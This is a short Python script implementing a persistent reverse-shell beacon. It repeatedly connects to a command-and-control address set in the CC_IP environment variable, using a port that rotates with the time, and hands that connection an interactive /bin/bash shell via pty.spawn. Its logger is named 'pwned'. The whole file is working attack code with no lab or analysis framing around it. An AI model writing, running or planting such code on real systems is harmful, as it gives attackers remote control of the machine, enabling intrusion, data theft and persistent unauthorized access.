import socket
import subprocess
import socket
import fcntl
import struct
import operator
import logging
import time
import random
import os
import pty
import sys

CC_IP = os.environ.get('CC_IP')
CC_INTERFACE = os.environ.get('CC_INTERFACE', 'eth0')
INTERVAL = float(os.environ.get('INTERVAL', 8))
LOG_LEVEL = os.environ.get('LOG_LEVEL', 'INFO')

_levelnum = getattr(logging, LOG_LEVEL.upper(), None)
if not isinstance(_levelnum, int):
    raise ValueError('Invalid log level: {}'.format(LOG_LEVEL))

logging.basicConfig(level=_levelnum, format="[%(process)d: %(levelname)s %(asctime)s] %(message)s", datefmt="%m-%d %H:%M:%S")
logger = logging.getLogger('pwned')

if __name__ == '__main__':
    while True:
        port = int(time.time()) % 0xFFF0 + 0x0F
        logger.info('Reaching out to %s:%d', CC_IP, port)

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((CC_IP, port))

                pid = os.fork()
                if pid == 0:
                    # We are in the child process
                    try:
                        os.dup2(s.fileno(), sys.stdout.fileno())
                        os.dup2(s.fileno(), sys.stdin.fileno())
                        ret = pty.spawn("/bin/bash")
                        logger.info("Reverse shell exited with code: %d", ret)
                    except Exception:
                        logger.exception("Reverse shell process threw!")
                    finally:
                        sys.exit(0)

        except OSError as err:
            logging.info("Exception: %s", err)

        logging.info("Sleeping for %0.2f seconds", INTERVAL)
        time.sleep(INTERVAL)
